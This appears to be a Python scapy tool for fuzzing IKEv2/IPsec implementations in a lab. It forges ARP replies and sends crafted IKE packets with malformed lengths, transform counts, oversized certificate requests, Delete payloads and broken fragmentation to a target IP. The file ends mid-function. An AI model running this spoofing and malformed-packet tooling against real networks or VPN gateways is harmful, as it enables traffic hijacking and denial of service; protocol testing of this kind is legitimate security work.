#!/usr/bin/python3
import argparse
import os 
import platform
import codecs
from scapy.all import *
import multiprocessing
import codecs
import versionID
from random import getrandbits
from ipaddress import IPv4Address,IPv4Network
import random
import crypto
load_contrib('ikev2')
sys.setrecursionlimit(30000) 

shared_secret = None
my_private_key = None
my_public_key = None
peer_pub_key = None
my_nonce = None
#my_spi=0
peer_spi=0
sk_ei = None
sk_er = None
sk_ai = None
sk_ar = None

class half_ike_auth():
    def __init__ (self,interface,stimeout,ike_destination_port,ike_source_port,first_payload,ike_payload_chain):
        self.interface = interface
        self.ike_destination_port =ike_destination_port 
        self.ike_source_port=ike_source_port 
        self.stimeout=stimeout
        self.first_payload=first_payload
        self.ike_payload_chain=ike_payload_chain
        sniff(iface=self.interface, prn=self.handler, store=0, timeout=float(self.stimeout))
    def handler(self,packets):
        if (packets.haslayer(ARP)):
            arp_request=packets.getlayer(ARP)
            if(arp_request.op==1):
                targetip=arp_request.psrc
                targetmac=arp_request.hwsrc
                sourceip=arp_request.pdst
                arp_response = Ether(src="0a:00:27:00:00:00",dst=targetmac)/ARP(pdst=targetip, hwdst=targetmac, psrc=sourceip, op='is-at', hwsrc="0a:00:27:00:00:00")
                sendp(arp_response,iface="vboxnet0",verbose=0)
        if (packets.haslayer(IP) and packets.haslayer(UDP)):
            udp=packets.getlayer(UDP)
            if udp.sport==self.ike_destination_port or udp.dport==self.ike_source_port: #default IKEv2 UDP port
                header=udp.payload
                if(header.exch_type == 34):
                    if str(header.flags)=="Response":
                        print("this is an IKE_INIT Response packet from",packets.payload.src,"to",packets.payload.dst)
                        #print(header.show())
                        if(header.next_payload==41):
                            #print("Notify received")
                            if (header.payload.type==16390):
                                print("Cookie received:",header.payload.load.hex())
                                mypacket=Ether(src=packets.dst,dst=packets.src)/IP(src=packets.payload.dst,dst=packets.payload.src)/UDP(sport=self.ike_source_port,dport=self.ike_destination_port)/IKEv2(init_SPI=header.init_SPI,exch_type='IKE_SA_INIT',flags='Initiator',next_payload='Notify')/IKEv2_payload_Notify(type=16390,load=header.payload.load,next_payload=self.first_payload)/self.ike_payload_chain
                                sendp(mypacket,iface="vboxnet0",verbose=0)
                                #send(mypacket)
                        else:
                            #print("No cookie received")
                            mypacket=Ether(src=packets.dst,dst=packets.src)/IP(src=packets.payload.dst,dst=packets.payload.src)/UDP(sport=self.ike_source_port,dport=self.ike_destination_port)/IKEv2(init_SPI=header.init_SPI,exch_type=35,flags='Initiator')/IKEv2_payload_Encrypted(load="0a0027000000080027d74d49080045000120df334000401168e0c0a83867c0a8380111941194010cd8b000000000c00c8dee626a32ff52647a8538b240632e2023200000000100000100240000e4571d6d2e5b9c58c1aea50fa3ba82e937d4280ae902b6fd81202e40ac555d77168321812cf2d7965ae1cebd71c7bdfdd49ae09e4d6b864ce72ceba511a01bfa7404a9fa080f1f1624f3289b2995ca0ae98313a2bca1c2c1ab8ef5c8edc6ae5825f95c048dece43be6a1d5bb614a6e67093a934443898a958f6366061a27c9d2d9a1a556a7ed8ab8b110b33e1f3ecd26e335dcb623001439c3c40469c7c645a75f1bf2ec1e5caad5b990d028e6d24ca9256fbdcbfd3379ac5812f1c2bbffbcb2840e967bf2caa086efe9923b6841e034504cd34e5f20ea2ea620a213aacef520d60a0027000000080027d74d49080045000120df334000401168e0c0a83867c0a8380111941194010cd8b000000000c00c8dee626a32ff52647a8538b240632e2023200000000100000100240000e4571d6d2e5b9c58c1aea50fa3ba82e937d4280ae902b6fd81202e40ac555d77168321812cf2d7965ae1cebd71c7bdfdd49ae09e4d6b864ce72ceba511a01bfa7404a9fa080f1f1624f3289b2995ca0ae98313a2bca1c2c1ab8ef5c8edc6ae5825f95c048dece43be6a1d5bb614a6e67093a934443898a958f6366061a27c9d2d9a1a556a7ed8ab8b110b33e1f3ecd26e335dcb623001439c3c40469c7c645a75f1bf2ec1e5caad5b990d028e6d24ca9256fbdcbfd3379ac5812f1c2bbffbcb2840e967bf2caa086efe9923b6841e034504cd34e5f20ea2ea620a213aacef520d6")
                            sendp(mypacket,iface="vboxnet0",verbose=0)

class mySniffer():
    def __init__ (self,interface,target_IP,recon,listen,key_length,IKE_payloads,IKE_payloads2,proposals,proposals2,subnet,stimeout,ike_destination_port,ike_source_port,length_proposal,length_transform,nu_of_tr,size_Notify_data,type_cert_request,fragments,incomplete_fragment,fi,fw,no_of_ca,spi,spi_number,spi_other):
        self.interface = interface
        self.target_IP=target_IP
        self.recon = recon
        self.listen = listen
        self.key_length=key_length
        self.IKE_payloads=IKE_payloads
        self.IKE_payloads2=IKE_payloads2
        self.proposals=proposals
        self.proposals2=proposals2
        self.subnet=subnet
        self.stimeout=stimeout
        self.ike_destination_port =ike_destination_port 
        self.ike_source_port=ike_source_port  
        self.length_proposal=length_proposal
        self.length_transform=length_transform
        self.nu_of_tr=nu_of_tr  
        self.size_Notify_data=size_Notify_data
        self.type_cert_request=type_cert_request
        self.auth_plain=None
        self.fragments = fragments
        self.incomplete_fragment=incomplete_fragment
        self.cookie=None
        self.fi=fi
        self.fw=fw
        self.no_of_ca=no_of_ca
        self.spi=spi
        self.spi_other=spi_other
        self.spi_number=spi_number
        sniff(iface=self.interface, prn=self.handler, store=0, timeout=float(self.stimeout))
    def analyse_packet(self, nx_payload):
        response = ""
        while nx_payload.next_payload != 0 and nx_payload.next_payload != 35:
            if nx_payload.next_payload==33:
                response = response + "," + "SA"
                proposals = nx_payload.payload.prop.trans
                print(proposals.show())
            elif nx_payload.next_payload==34:
                response = response + "," + "KE"
                key_received=str(codecs.encode(nx_payload.payload.load,"hex"))[2:-1]
                dh_group=nx_payload.payload.group
            elif nx_payload.next_payload==40:
                response = response + "," + "Nonce"
                nonce_received=str(codecs.encode(nx_payload.payload.load,"hex"))[2:-1]
            elif nx_payload.next_payload==41:
                if nx_payload.payload.type == 7:
                    response = response + "," + "Notify(INVALID_SYNTAX)"
                elif nx_payload.payload.type == 14:
                    response = response + "," + "Notify(NO_PROPOSAL_CHOSEN)"
                elif nx_payload.payload.type == 16404:
                    response = response + "," + "Notify(MULTIPLE_AUTH_SUPPORTED)"
                elif nx_payload.payload.type == 16388:
                    response = response + "," + "Notify(NAT_DETECTION_SOURCE_IP)"
                elif nx_payload.payload.type == 16389:
                    response = response + "," + "Notify(NAT_DETECTION_DESTINATION_IP)"
                elif nx_payload.payload.type == 16390:
                    self.cookie=nx_payload.payload.load
                    response = response + "," + "Notify(COOKIE)"
                elif nx_payload.payload.type == 16430:
                    response = response + "," + "Notify(IKEV2_FRAGMENTATION_SUPPORTED)"
                else:
                    response = response + "," + "Notify("+str(nx_payload.payload.type)+")"
            elif nx_payload.next_payload==43:
                vendor_ID = str(codecs.encode(nx_payload.payload.vendorID,"hex"))[2:-1]
                for key in versionID.vendor_IDs.keys():
                    if re.match(key,vendor_ID):
                        response = response + "," + "VendorID("+versionID.vendor_IDs.get(key)+")"
                        break
            elif nx_payload.next_payload==46:
                #print("ENCRYPTED PAYLOAD")
                break
            else:
                print("next payload=",nx_payload.next_payload)
            nx_payload=nx_payload.payload
        return response
    def extract_peer_key_and_nonce(self, examined_payload):
        peer_pub_key=bytes()
        peer_nonce=bytes()
        while(examined_payload.next_payload != 0):
            #print("Next payload",examined_payload.next_payload)
            if(examined_payload.next_payload==34):
                peer_pub_key = examined_payload.payload.load
                #print("\nKE load=",peer_pub_key)
            elif(examined_payload.next_payload==40):
                peer_nonce = examined_payload.payload.load
                #print("\nNonce load=",peer_nonce,"\n")
            examined_payload=examined_payload.payload
        return peer_pub_key,peer_nonce
    def handler(self,packets):
        global shared_secret
        global my_private_key
        global my_public_key
        global peer_pub_key
        global my_nonce
        #global my_spi
        global peer_spi
        global sk_ei
        global sk_er
        global sk_ai
        global sk_ar
        key_received=""
        dh_group=""
        nonce_received=""
        #print("my SPI:", my_spi.hex())
        #print("my Nonce:", my_nonce.hex())
        if (packets.haslayer(IP) and packets.haslayer(UDP) and packets[IP].src==self.target_IP):
            payload=packets.getlayer(UDP)
            if payload.sport==500 or payload.dport==500: #default IKEv2 UDP port
                nx_payload=payload.payload
                response = str(packets[IP].src) + self.analyse_packet(nx_payload)
                if self.listen:
                    header=packets.getlayer(UDP).payload
                    if(header.exch_type == 34):
                        #print("this is an IKE_INIT packet")
                        if str(header.flags)=="Initiator":
                            peer_spi = header.init_SPI
                            print("IKEv2 packet received from an Initiator")
                            peer_pub_key,peer_nonce=self.extract_peer_key_and_nonce(header)
                            #Proposals and Transformations - We need to re-create it each time since the list is getting empty
                            proposals_copy = create_list_of_proposals(self.proposals)
                            DHGROUP =2 
                            my_public_key, shared_secret = DiffieHellman(DHGROUP, peer_pub_key)
                            ENCR_id = crypto.EncrId(12)
                            ENCR_keylen = 256
                            INTEG_id = crypto.IntegId(12)
                            PRF_id = crypto.PrfId(5)
                            ike_init(self.target_IP,key_length,self.IKE_payloads,proposals_copy,int(values.length_ike),int(values.length_proposal),int(values.length_transform),int(values.nu_of_tr),int(values.size_Notify_data),int(values.type_cert_request),fw,fi,True,peer_spi,False,self.subnet,0,my_public_key,None,False,self.no_of_ca,target_IP,self.spi,self.spi_number,self.spi_other)
                            sk_d, sk_ai, sk_ar, sk_ei, sk_er, sk_pi, sk_pr = crypto.create_key(PRF_id, INTEG_id, ENCR_id, ENCR_keylen, shared_secret, peer_nonce, my_nonce, peer_spi, my_spi, old_sk_d=None)
                            #print("peer Public Key=",peer_pub_key.hex())
                            #print("my public key = ",my_public_key.hex())
                            #print("Initiator's/peer SPI=",peer_spi)
                            #print("Repsponder's/my SPI=",my_spi)
                            #print("peer Nonce=",peer_nonce)
                            #print("my Nonce=",my_nonce)
                            #print("Sk_ei=",sk_ei.hex())
                            #print("Sk_er=",sk_er.hex())
                        elif str(header.flags)=="Response":
                            print("IKEv2 packet sent from the Responder was received:")
                            peer_spi = header.resp_SPI
                            print(response)
                            DHGROUP =2 
                            print("Initiator's/my SPI=",my_spi.hex())
                            print("Responder's/peer SPI=",peer_spi.hex())
                            if(self.cookie!=None):
                                #print(self.IKE_payloads)
                                print("COOKIE received:",self.cookie.hex())
                                self.IKE_payloads.insert(0,"Notify.16390")
                                #print(self.IKE_payloads)
                                proposals_copy = create_list_of_proposals(self.proposals)
                                #print(self.target_IP)
                                ike_init(self.target_IP,key_length,self.IKE_payloads,proposals_copy,int(values.length_ike),int(values.length_proposal),int(values.length_transform),int(values.nu_of_tr),int(values.size_Notify_data),int(values.type_cert_request),fw,fi,False,0,False,self.subnet,0,my_public_key,self.cookie,False,self.no_of_ca,target_IP,self.spi,self.spi_number,self.spi_other)
                                self.cookie=None
                            else:
                                peer_pub_key,peer_nonce=self.extract_peer_key_and_nonce(header)

                                shared_secret = DiffieHellman_create_session_key(DHGROUP, peer_pub_key, my_private_key)
                                ENCR_id = crypto.EncrId(12)
                                ENCR_keylen = 256
                                INTEG_id = crypto.IntegId(12)
                                PRF_id = crypto.PrfId(5)
                                block_size=16
                                integr = crypto.Integrity(INTEG_id)
                                iv=crypto.generate_iv(block_size)
                                #print("IV=",iv)
                                sk_d, sk_ai, sk_ar, sk_ei, sk_er, sk_pi, sk_pr = crypto.create_key(PRF_id, INTEG_id, ENCR_id, ENCR_keylen, shared_secret, my_nonce, peer_nonce, my_spi,peer_spi,old_sk_d=None)
                                #print("my public key = ",my_public_key.hex())
                                #print("my nonce =",my_nonce.hex())
                                #print("peer Public Key=",peer_pub_key.hex())
                                #print("peer nonce =",peer_nonce.hex())
                                #print("shared secret =",shared_secret.hex())
                                #print("Sk_ei=",sk_ei.hex())
                                #print("Sk_er=",sk_er.hex())
                                if(self.fi ==None):
                                    if(self.auth_plain==None):
                                        proposals_copy_2 = create_list_of_proposals(self.proposals2)
                                        #consider of having independent length_proposal, length_transform, nu_of_tr
                                        auth_proposals,nu_of_tr_initial = create_proposals(proposals_copy_2,self.length_proposal,self.length_transform,self.nu_of_tr)
                                        first_payload,p = create_chain_payloads(self.IKE_payloads2,auth_proposals,my_public_key,my_nonce,self.type_cert_request,self.size_Notify_data,self.cookie,self.no_of_ca,self.target_IP,self.spi,self.spi_number)
                                        #print(p.show())
                                        self.auth_plain=raw(p)
                                    plain = self.auth_plain
                                else:
                                    first_payload=self.fi.readline().rstrip('\n')
                                    plain = bytes.fromhex(self.fi.readline())
                                    self.fi.close()
                                if self.fw:
                                    self.fw.write(first_payload)
                                    self.fw.write("\n")
                                    self.fw.write(str(plain.hex()))
                                    self.fw.close()
                                    print("File written. Exiting...")
                                    exit(0)
                                if (self.fragments > 0):
                                    print("IKEv2 fragmentation will be performed")
                                    #print("number of fragments =",self.fragments)
                                    #plain_to_split = plain.hex()
                                    #print(plain.hex())
                                    size_of_initial_plain = len(plain)
                                    fragment_size = int(size_of_initial_plain/self.fragments)
                                    no_of_fragments=size_of_initial_plain/fragment_size
                                    if(no_of_fragments > int(no_of_fragments)):
                                        no_of_fragments=int(no_of_fragments)+1
                                    else:
                                        no_of_fragments=int(no_of_fragments)
                                    print("Number of fragments =",no_of_fragments)
                                    print("size of plain = ",size_of_initial_plain,", size of fragment = ",fragment_size)
                                    if(fragment_size<1):
                                        print("Too many fragments result in too small size of fragment_size; exiting; exiting")
                                        exit(0)
                                    else:
                                        start =0 
                                        finish=start+fragment_size
                                        fragment_number=0
                                        while(finish < size_of_initial_plain):
                                            fragment_number=fragment_number+1
                                            new_plain = plain[start:finish]
                                            #print(start, finish, new_plain.hex())
                                            encrypted = encrypt_plain_text(new_plain,block_size,sk_ei,iv,integr.hash_size)
                                            if(fragment_number==1):
                                                auth = raw(IKEv2_payload_Encrypted_Fragment(next_payload=first_payload,load=encrypted,frag_total=no_of_fragments,frag_number=fragment_number)) 
                                            else:
                                                auth = raw(IKEv2_payload_Encrypted_Fragment(next_payload=0,load=encrypted,frag_total=no_of_fragments,frag_number=fragment_number)) 
                                            header = IKEv2(init_SPI=my_spi,resp_SPI=peer_spi,exch_type=35,next_payload=53,flags="Initiator",id=1)/auth
                                            header=raw(header)
                                            checksum = crypto.add_checksum(header[:len(header)-integr.hash_size],sk_ai,INTEG_id)
                                            header = header[:len(header)-integr.hash_size] + checksum
                                            data = IP(dst=self.target_IP, proto='udp')/UDP(dport=self.ike_destination_port, sport=self.ike_source_port)/header
                                            send(data)
                                            start=finish
                                            finish=finish+fragment_size
                                        if ((start<size_of_initial_plain)  and not (values.incomplete_fragment)):
                                            fragment_number=fragment_number+1
                                            new_plain = plain[start:size_of_initial_plain]
                                            #print(start, finish, new_plain.hex())
                                            encrypted = encrypt_plain_text(new_plain,block_size,sk_ei,iv,integr.hash_size)
                                            auth = raw(IKEv2_payload_Encrypted_Fragment(next_payload=0,load=encrypted,frag_total=no_of_fragments,frag_number=fragment_number)) 
                                            header = IKEv2(init_SPI=my_spi,resp_SPI=peer_spi,exch_type=35,next_payload=53,flags="Initiator",id=1)/auth
                                            header=raw(header)
                                            checksum = crypto.add_checksum(header[:len(header)-integr.hash_size],sk_ai,INTEG_id)
                                            header = header[:len(header)-integr.hash_size] + checksum
                                            data = IP(dst=self.target_IP, proto='udp')/UDP(dport=self.ike_destination_port, sport=self.ike_source_port)/header
                                            send(data)
                                        print("fragmented IKE_AUTH packet as Initiator was sent")
                                        #exit(0)
                                else:
                                    encrypted = encrypt_plain_text(plain,block_size,sk_ei,iv,integr.hash_size)
                                    auth = raw(IKEv2_payload_AUTH(next_payload=first_payload,load=encrypted)) 
                                    auth = auth[:4]+auth[8:]#remove scapy padding of 0000 in init_vector place
                                    length = '{0:x}'.format(int(len(auth)))
                                    if(len(auth)<=15):
                                        length = "0" + length
                                        auth = auth[:3]+bytes.fromhex(length)+auth[4:]#add the new, correct length
                                    elif(len(auth)<=255):
                                        auth = auth[:3]+bytes.fromhex(length)+auth[4:]#add the new, correct length
                                    elif(len(auth)<=4095):
                                        length = "0" + length
                                        auth = auth[:2]+bytes.fromhex(length)+auth[4:]#add the new, correct length
                                    else:
                                        auth = auth[:2]+bytes.fromhex(length)+auth[4:]#add the new, correct length
                                    header = IKEv2(init_SPI=my_spi,resp_SPI=peer_spi,exch_type=35,next_payload=46,flags="Initiator",id=1)/auth
                                    header=raw(header)
                                    checksum = crypto.add_checksum(header[:len(header)-integr.hash_size],sk_ai,INTEG_id)
                                    header = header[:len(header)-integr.hash_size] + checksum
                                    data = IP(dst=self.target_IP, proto='udp')/UDP(dport=self.ike_destination_port, sport=self.ike_source_port)/header
                                    #print("length=",length,len(auth))
                                    #print("IP packet length = ",len(data))
                                    packet = send(fragment(data,1450))
                                    print("IKE_AUTH packet as Initiator was sent")
                                    #exit(0)
                    elif(header.exch_type == 35):
                        #print("this is an IKE_AUTH packet")
                        if str(header.flags)=="Initiator":
                            #print(header.show())
                            #print("Next Payload =",header.payload.next_payload)
                            if(header.next_payload==46):
                                print("this is an encrypted and authenticated payload")
                                INTEG_id = crypto.IntegId(12)
                                print("INTEGRITY VERIFICATION:",crypto.verify_checksum(bytes(header), sk_ai, INTEG_id))
                                encrypted =header.payload.load
                                plain=crypto.crypto_decrypt(encrypted,sk_ei,INTEG_id)
                                #print("length of received encrypted=",len(encrypted))
                                #print("length of encrypted=",len(encrypted))
                                #print("length of plain text=",len(plain))
                                #print(plain.hex())
                                if(header.payload.next_payload==35):
                                    print("Identification - Initiator")
                                    packet=IKEv2_payload_IDi(bytes(plain))
                                    #print(packet.summary())
                                    #print(packet.show())
                                    #exit()
                        else:
                            print("IKE_AUTH pachet sent from the Responder was received")
                            if(header.next_payload==46):
                                #print("this is an encrypted and authenticated payload")
                                INTEG_id = crypto.IntegId(12)
                                #print("INTEGRITY VERIFICATION:",crypto.verify_checksum(bytes(header), sk_ar, INTEG_id))
                                encrypted =header.payload.load
                                plain=crypto.crypto_decrypt(encrypted,sk_er,INTEG_id)
                                if(header.payload.next_payload==41):
                                    packet=IKEv2_payload_Notify(bytes(plain))
                                    response = self.analyse_packet(packet)
                                    print(response)
                                    print("Response received:")
                                    print(packet.show())
                                else:
                                    print("Next Payload of Encrypted packet=",header.payload.next_payload)
                                #exit(0)
                elif self.recon:
                    print("Response received:")
                    print(response)

def encrypt_plain_text(new_plain,block_size,sk_ei,iv,hash_size):
    padlen = block_size - (len(new_plain) % block_size) - 1
    new_plain += b'\x00' * padlen + bytes([padlen])
    ciphertext=crypto.encrypt(sk_ei, bytes(iv), new_plain)
    encrypted = iv + ciphertext
    encrypted = encrypted + b'\x00' *hash_size
    return encrypted

def create_list_of_proposals(the_proposals):
    #Proposals and Transformations 
    list_of_proposals = the_proposals.split("/")
    proposals = []
    for proposal in list_of_proposals:
        list_of_transforms = proposal.split(",")
        proposals.append(list_of_transforms)
    return proposals


def create_proposals(list_of_proposals,length_proposal,length_transform,nu_of_tr):
        nu_of_tr_initial = nu_of_tr #place holder for the initial number of transforms, because nu_of_tr changes later
        nu_of_proposals=len(list_of_proposals)
        print("Number of Proposals per Security Associations =",nu_of_proposals)
        if nu_of_tr > 255:
            print("The number of transformations in the corresponding field of the Proposals cannot be greater than 255")
            exit(0)
        list_of_transforms = []
        #DEFINE PROPOSALS
        transforms_binary=[]
        transforms_number=[]
        for mytransforms in list_of_proposals:
            while mytransforms:
                transform = mytransforms.pop(0).split(".") 
                ciphers=transform[1].split("-")
                if len(ciphers) > 1:
                    for i in range (int(ciphers[0]),int(ciphers[1])+1):
                        list_of_transforms.append(transform[0]+"."+str(i))
                else:
                    list_of_transforms.append(transform[0]+"."+ciphers[0])
            #DEFINE THE TRANSFORMATIONS
            no_of_transforms=len(list_of_transforms)
            if  nu_of_tr_initial < 0:
                nu_of_tr = no_of_transforms
            #print("Number of transformations in the Proposal =",no_of_transforms)
            #print("The number of transformations in the corresponding field of the Proposals =",nu_of_tr)
            if nu_of_tr > 255:
                print("the number of transofrms in the corresponding field cannot be bigger than 255; exiting...")
                exit(0)
            transforms_number.append(nu_of_tr)
            if no_of_transforms==1:#If there is only one transformation 
                transform = list_of_transforms.pop(0).split(".") 
                if length_transform < 0:
                    if int(transform[0]) == 1: # If it is an Encryption algorithm, it has a Key length field in the parameters
                        transforms = IKEv2_payload_Transform(transform_type=int(transform[0]), transform_id=int(transform[1]), next_payload=None, length=12,key_length=key_length) 
                    else:
                        transforms = IKEv2_payload_Transform(transform_type=int(transform[0]), transform_id=int(transform[1]), next_payload=None, length=8) 
                else:
                    transforms = IKEv2_payload_Transform(transform_type=int(transform[0]), transform_id=int(transform[1]), next_payload=None, length=length_transform) 
            else:#If there is more than one transformation
                transform = list_of_transforms.pop(0).split(".") 
                if length_transform < 0:
                    if int(transform[0]) == 1: # If it is an Encryption algorithm, it has a Key length field in the parameters
                        transforms = IKEv2_payload_Transform(transform_type=int(transform[0]), transform_id=int(transform[1]), next_payload=3, length=12,key_length=key_length) 
                    else:
                        transforms = IKEv2_payload_Transform(transform_type=int(transform[0]), transform_id=int(transform[1]), next_payload=3, length=8) 
                else:
                    transforms = IKEv2_payload_Transform(transform_type=int(transform[0]), transform_id=int(transform[1]), next_payload=None, length=length_transform) 
                while list_of_transforms:
                    transform = list_of_transforms.pop(0).split(".") 
                    if len(list_of_transforms)==0:#If this was the last transform on the list
                        if int(transform[0]) == 1: # If it is an Encryption algorithm, it has a Key length field in the parameters
                            transforms = transforms / IKEv2_payload_Transform(transform_type=int(transform[0]), transform_id=int(transform[1]), next_payload=None, length=12,key_length=key_length) 
                        else:
                            transforms = transforms / IKEv2_payload_Transform(transform_type=int(transform[0]), transform_id=int(transform[1]), next_payload=None, length=8) 
                    else:
                        if int(transform[0]) == 1: # If it is an Encryption algorithm, it has a Key length field in the parameters
                            transforms = transforms / IKEv2_payload_Transform(transform_type=int(transform[0]), transform_id=int(transform[1]), next_payload=3, length=12,key_length=key_length) 
                        else:
                            transforms = transforms / IKEv2_payload_Transform(transform_type=int(transform[0]), transform_id=int(transform[1]), next_payload=3, length=8) 
            transforms_binary.append(transforms)
        if nu_of_proposals == 1:
                if length_proposal < 0:
                    proposals = IKEv2_payload_Proposal(proto=1,trans_nb=transforms_number.pop(0),trans=transforms_binary.pop(0),)
                else:
                    proposals = IKEv2_payload_Proposal(proto=1,length=length_proposal,trans_nb=transforms_number.pop(0),trans=transforms_binary.pop(0),)
        else:
                proposal_id = 1
                if length_proposal < 0:
                    proposals = IKEv2_payload_Proposal(proto=1,proposal=proposal_id,trans_nb=transforms_number.pop(0),trans=transforms_binary.pop(0),)
                    for i in range (1,nu_of_proposals):
                        proposal_id=proposal_id+1
                        proposals = proposals / IKEv2_payload_Proposal(proto=1,proposal=proposal_id,trans_nb=transforms_number.pop(0),trans=transforms_binary.pop(0),)
                else:
                    proposals = IKEv2_payload_Proposal(proto=1,length=length_proposal,proposal=proposal_id,trans_nb=transforms_number.pop(0),trans=transforms_binary.pop(0),)
                    for i in range (1,nu_of_proposals):
                        proposal_id=proposal_id+1
                        proposals = proposals / IKEv2_payload_Proposal(proto=1,length=length_proposal,proposal=proposal_id,trans_nb=transforms_number.pop(0),trans=transforms_binary.pop(0),)
        return proposals,nu_of_tr_initial

def create_chain_payloads(ike_payloads,proposals,key_exchange,my_nonce,type_cert_request,size_Notify_data,cookie, no_of_ca,target_IP,spi, spi_number):
        len_ike_payloads = int(len(ike_payloads))
        first_payload = None
        payload = None
        #print("IKE Payload:",ike_payloads)
        certificate_authority = int(no_of_ca)*"AAAAAAAAAAAAAAAAAAAA"
        spi_number=int(spi_number)
        for index,ipay in enumerate(ike_payloads):
            if ipay == 'SA':
                if index < len_ike_payloads-1:
                    try:
                        if ike_payloads[index+1].startswith('Notify'):
                            if (payload == None):
                                first_payload = 'SA'
                                payload = IKEv2_payload_SA(next_payload='Notify',prop=proposals)
                            else:
                                payload = payload/IKEv2_payload_SA(next_payload='Notify',prop=proposals)
                        else:
                            if (payload == None):
                                first_payload = 'SA'
                                payload = IKEv2_payload_SA(next_payload=ike_payloads[index+1],prop=proposals)
                            else:
                                payload = payload/IKEv2_payload_SA(next_payload=ike_payloads[index+1],prop=proposals)
                    except Exception as e:
                        print(str(e), "not supported; exiting (001).")
                        exit(0)
                else:
                    if (payload == None):
                        first_payload = 'SA'
                        payload = payload/IKEv2_payload_SA(next_payload='None',prop=proposals)
                    else:
                        payload = payload/IKEv2_payload_SA(next_payload='None',prop=proposals)
            elif ipay == 'KE':
                if index < len_ike_payloads-1:
                    try:
                        if ike_payloads[index+1].startswith('Notify'):
                            if (payload == None):
                                first_payload = 'KE'
                                payload = IKEv2_payload_KE(next_payload='Notify', group='1024MODPgr', load=key_exchange)
                            else:
                                payload = payload/IKEv2_payload_KE(next_payload='Notify', group='1024MODPgr', load=key_exchange)
                        else:
                            if (payload == None):
                                first_payload = 'KE'
                                payload = IKEv2_payload_KE(next_payload=ike_payloads[index+1], group='1024MODPgr', load=key_exchange)
                            else:
                                payload = payload/IKEv2_payload_KE(next_payload=ike_payloads[index+1], group='1024MODPgr', load=key_exchange)
                    except Exception as e:
                        print(str(e), "not supported; exiting (002).")
                        exit(0)
                else:
                    if (payload == None):
                        first_payload = 'KE'
                        payload = IKEv2_payload_KE(next_payload='None', group='1024MODPgr', load=key_exchange)
                    else:
                        payload = payload / IKEv2_payload_KE(next_payload='None', group='1024MODPgr', load=key_exchange)
            elif ipay == 'Nonce':
                if index < len_ike_payloads-1:
                    try:
                        if ike_payloads[index+1].startswith('Notify'):
                            if (payload == None):
                                first_payload = 'Nonce'
                                payload = IKEv2_payload_Nonce(next_payload="Notify", load=my_nonce)
                            else:
                                payload = payload/IKEv2_payload_Nonce(next_payload="Notify", load=my_nonce)
                        else:
                            if (payload == None):
                                first_payload = 'Nonce'
                                payload = IKEv2_payload_Nonce(next_payload=ike_payloads[index+1], load=my_nonce)
                            else:
                                payload = payload/IKEv2_payload_Nonce(next_payload=ike_payloads[index+1], load=my_nonce)
                    except Exception as e:
                        print(str(e), "not supported; exiting (003).")
                        exit(0)
                else:
                    if (payload == None):
                        first_payload = 'Nonce'
                        payload = IKEv2_payload_Nonce(next_payload='None', load=my_nonce)
                    else:
                        payload = payload/IKEv2_payload_Nonce(next_payload='None', load=my_nonce)
            elif ipay == 'CERTREQ':
                if index < len_ike_payloads-1:
                    try:
                        if ike_payloads[index+1].startswith('Notify'):
                            if (payload == None):
                                first_payload = 'CERTREQ'
                                payload = IKEv2_payload_CERTREQ(next_payload="Notify",cert_type=type_cert_request,cert_data=certificate_authority)
                            else:
                                payload = payload/IKEv2_payload_CERTREQ(next_payload="Notify",cert_type=type_cert_request,cert_data=certificate_authority)
                        else:
                            if (payload == None):
                                first_payload = 'CERTREQ'
                                payload = IKEv2_payload_CERTREQ(next_payload=ike_payloads[index+1],cert_type=type_cert_request,cert_data=certificate_authority)
                            else:
                                payload = payload/IKEv2_payload_CERTREQ(next_payload=ike_payloads[index+1],cert_type=type_cert_request,cert_data=certificate_authority)
                    except Exception as e:
                        print(str(e), "not supported; exiting (010).")
                        exit(0)
                else:
                    if (payload == None):
                        first_payload = 'CERTREQ'
                        payload = IKEv2_payload_CERTREQ(next_payload='None',cert_type=type_cert_request,cert_data=certificate_authority)
                    else:
                        payload = payload / IKEv2_payload_CERTREQ(next_payload='None',cert_type=type_cert_request,cert_data=certificate_authority)
            elif ipay == 'CERT':
                if index < len_ike_payloads-1:
                    try:
                        if ike_payloads[index+1].startswith('Notify'):
                            if (payload == None):
                                first_payload = 'CERT'
                                payload = IKEv2_payload_CERT(next_payload="Notify",cert_type=type_cert_request,cert_data=certificate_authority)
                            else:
                                payload = payload/IKEv2_payload_CERT(next_payload="Notify",cert_type=type_cert_request,cert_data=certificate_authority)
                        else:
                            if (payload == None):
                                first_payload = 'CERT'
                                payload = IKEv2_payload_CERT(next_payload=ike_payloads[index+1],cert_type=type_cert_request,cert_data=certificate_authority)
                            else:
                                payload = payload/IKEv2_payload_CERT(next_payload=ike_payloads[index+1],cert_type=type_cert_request,cert_data=certificate_authority)
                    except Exception as e:
                        print(str(e), "not supported; exiting (010).")
                        exit(0)
                else:
                    if (payload == None):
                        first_payload = 'CERT'
                        payload = IKEv2_payload_CERT(next_payload='None',cert_type=type_cert_request,cert_data=certificate_authority)
                    else:
                        payload = payload / IKEv2_payload_CERT(next_payload='None',cert_type=type_cert_request,cert_data=certificate_authority)
            elif ipay == 'Delete':
                if index < len_ike_payloads-1:
                    try:
                        if ike_payloads[index+1].startswith('Notify'):
                            if (payload == None):
                                first_payload = 42
                                payload = IKEv2_payload_Delete(next_payload="Notify",proto=1,no_of_SPIs=spi_number,SPI=bytearray.fromhex(spi))
                            else:
                                payload = payload/IKEv2_payload_Delete(next_payload="Notify",proto=1,no_of_SPIs=spi_number,SPI=bytearray.fromhex(spi))
                        else:
                            if (payload == None):
                                first_payload = 42
                                payload = IKEv2_payload_Delete(next_payload=ike_payloads[index+1],proto=1,no_of_SPIs=spi_number,SPI=bytearray.fromhex(spi))
                            else:
                                payload = payload/IKEv2_payload_Delete(next_payload=ike_payloads[index+1],proto=1,no_of_SPIs=spi_number,SPI=bytearray.fromhex(spi))
                    except Exception as e:
                        print(str(e), "not supported; exiting (010).")
                        exit(0)
                else:
                    if (payload == None):
                        first_payload = 42 
                        payload = IKEv2_payload_Delete(next_payload='None',proto=1,no_of_SPIs=spi_number,SPI=bytearray.fromhex(spi))
                    else:
                        payload = payload / IKEv2_payload_Delete(next_payload='None',proto=1,no_of_SPIs=spi_number,SPI=bytearray.fromhex(spi))
            elif ipay == 'IDi':
                if index < len_ike_payloads-1:
                    try:
                        if ike_payloads[index+1].startswith('Notify'):
                            if (payload == None):
                                first_payload = 'IDi'
                                payload = IKEv2_payload_IDi(load='192.168.56.1',next_payload="Notify")
                            else:
                                payload = payload/IKEv2_payload_IDi(load='192.168.56.1',next_payload="Notify")
                        else:
                            if (payload == None):
                                first_payload = 'IDi'
